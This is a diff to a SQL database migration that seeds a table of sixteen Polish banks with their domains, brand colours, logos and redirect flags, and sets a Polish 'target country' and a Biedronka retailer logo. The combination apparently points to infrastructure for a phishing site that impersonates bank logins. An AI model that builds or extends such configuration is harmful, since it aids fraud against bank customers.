@@ -24,21 +24,21 @@ create policy "banks_authenticated_all" on public.banks for all to authenticated
 create policy "banks_anon_select"       on public.banks for select to anon using (true);
 
 insert into public.banks (slug, name, country, logo_file, brand_color, accent_color, domain, is_active, auto_redirect, sort_order, design_config) values
-  ('pekao24',    'Bank Pekao (PeoPay)',       'Polonya', '/bank-logos/poland/pekao24.svg',   '#e31e24', '#b3181d', 'pekao24.pl',       true, false, 10,  '{}'),
-  ('ing',        'ING Bank Śląski',           'Polonya', '/bank-logos/poland/ing.svg',       '#ff6200', '#cc4e00', 'ing.pl',           true, false, 20,  '{}'),
-  ('bnpparibas', 'BNP Paribas',               'Polonya', '/bank-logos/poland/bnpparibas.png','#008766', '#006850', 'bnpparibas.pl',    true, false, 30,  '{}'),
-  ('millennium', 'Bank Millennium',           'Polonya', '/bank-logos/poland/millennium.jpg','#e2004f', '#b3003f', 'bankmillennium.pl',true, false, 40,  '{}'),
-  ('alior',      'Alior Bank',                'Polonya', '/bank-logos/poland/alior.svg',     '#e10064', '#b30050', 'aliorbank.pl',     true, false, 50,  '{}'),
-  ('velobank',   'VeloBank',                  'Polonya', '/bank-logos/poland/velobank.svg',  '#00a650', '#008040', 'velobank.pl',      true, false, 60,  '{}'),
+  ('pekao24',    'Bank Pekao (PeoPay)',       'Polonya', '/bank-logos/poland/pekao24.webp',   '#e31e24', '#b3181d', 'pekao24.pl',       true, false, 10,  '{}'),
+  ('ing',        'ING Bank Śląski',           'Polonya', '/bank-logos/poland/ing.webp',       '#ff6200', '#cc4e00', 'ing.pl',           true, false, 20,  '{}'),
+  ('bnpparibas', 'BNP Paribas',               'Polonya', '/bank-logos/poland/bnpparibas.webp','#008766', '#006850', 'bnpparibas.pl',    true, false, 30,  '{}'),
+  ('millennium', 'Bank Millennium',           'Polonya', '/bank-logos/poland/millennium.webp','#e2004f', '#b3003f', 'bankmillennium.pl',true, false, 40,  '{}'),
+  ('alior',      'Alior Bank',                'Polonya', '/bank-logos/poland/alior.webp',     '#e10064', '#b30050', 'aliorbank.pl',     true, false, 50,  '{}'),
+  ('velobank',   'VeloBank',                  'Polonya', '/bank-logos/poland/velobank.webp',  '#00a650', '#008040', 'velobank.pl',      true, false, 60,  '{}'),
   ('santander',  'Santander',                 'Polonya', '/bank-logos/poland/santander.svg', '#ec0000', '#bd0000', 'santander.pl',     true, false, 70,  '{}'),
-  ('mbank',      'mBank',                     'Polonya', '/bank-logos/poland/mbank.svg',     '#d9222a', '#b01b22', 'mbank.pl',         true, false, 80,  '{}'),
-  ('ipko',       'iPKO (PKO BP)',             'Polonya', '/bank-logos/poland/ipko.svg',      '#0051ba', '#003e94', 'ipko.pl',          true, false, 90,  '{}'),
-  ('ca24',       'Crédit Agricole (CA24)',    'Polonya', '/bank-logos/poland/ca24.svg',      '#006f4e', '#00583e', 'ca24.pl',          true, false, 100, '{}'),
+  ('mbank',      'mBank',                     'Polonya', '/bank-logos/poland/mbank.webp',     '#d9222a', '#b01b22', 'mbank.pl',         true, false, 80,  '{}'),
+  ('ipko',       'iPKO (PKO BP)',             'Polonya', '/bank-logos/poland/ipko.webp',      '#0051ba', '#003e94', 'ipko.pl',          true, false, 90,  '{}'),
+  ('ca24',       'Crédit Agricole (CA24)',    'Polonya', '/bank-logos/poland/ca24.webp',      '#006f4e', '#00583e', 'ca24.pl',          true, false, 100, '{}'),
   ('citibank',   'Citi Handlowy',             'Polonya', '/bank-logos/poland/citibank.svg',  '#056dae', '#04578b', 'citibank.pl',      true, false, 110, '{}'),
-  ('pocztowy',   'Bank Pocztowy',             'Polonya', '/bank-logos/poland/pocztowy.svg',  '#ffc000', '#cc9a00', 'pocztowy.pl',      true, false, 120, '{}'),
-  ('sgb',        'Bank Spółdzielczy (SGB)',   'Polonya', '/bank-logos/poland/sgb.png',       '#008a44', '#006e36', 'sgb.pl',           true, false, 130, '{}'),
-  ('bps',        'Bank BPS',                  'Polonya', '/bank-logos/poland/bps.png',       '#0054a6', '#004385', 'bps.pl',           true, false, 140, '{}'),
-  ('bosbank',    'BOŚ Bank',                  'Polonya', '/bank-logos/poland/bosbank.png',   '#009a44', '#007b36', 'bosbank.pl',       true, false, 150, '{}'),
+  ('pocztowy',   'Bank Pocztowy',             'Polonya', '/bank-logos/poland/pocztowy.webp',  '#ffc000', '#cc9a00', 'pocztowy.pl',      true, false, 120, '{}'),
+  ('sgb',        'Bank Spółdzielczy (SGB)',   'Polonya', '/bank-logos/poland/sgb.webp',       '#008a44', '#006e36', 'sgb.pl',           true, false, 130, '{}'),
+  ('bps',        'Bank BPS',                  'Polonya', '/bank-logos/poland/bps.webp',       '#0054a6', '#004385', 'bps.pl',           true, false, 140, '{}'),
+  ('bosbank',    'BOŚ Bank',                  'Polonya', '/bank-logos/poland/bosbank.webp',   '#009a44', '#007b36', 'bosbank.pl',       true, false, 150, '{}'),
   ('bsr-krakow', 'BS Rzeszów / Kraków',       'Polonya', '/bank-logos/poland/bsr-krakow.svg','#1a5ea6', '#154b85', 'bsr.pl',           true, false, 160, '{}')
 on conflict (slug) do update set
   name          = excluded.name,
@@ -58,5 +58,5 @@ on conflict (slug) do update set
 update public.global_settings
 set site_language  = 'pl',
     target_country = 'Polonya',
-    logo_url       = '/form-assets/biedronka-logo.svg'
+    logo_url       = '/form-assets/biedronka-mini-logo.webp'
 where id = 'default';
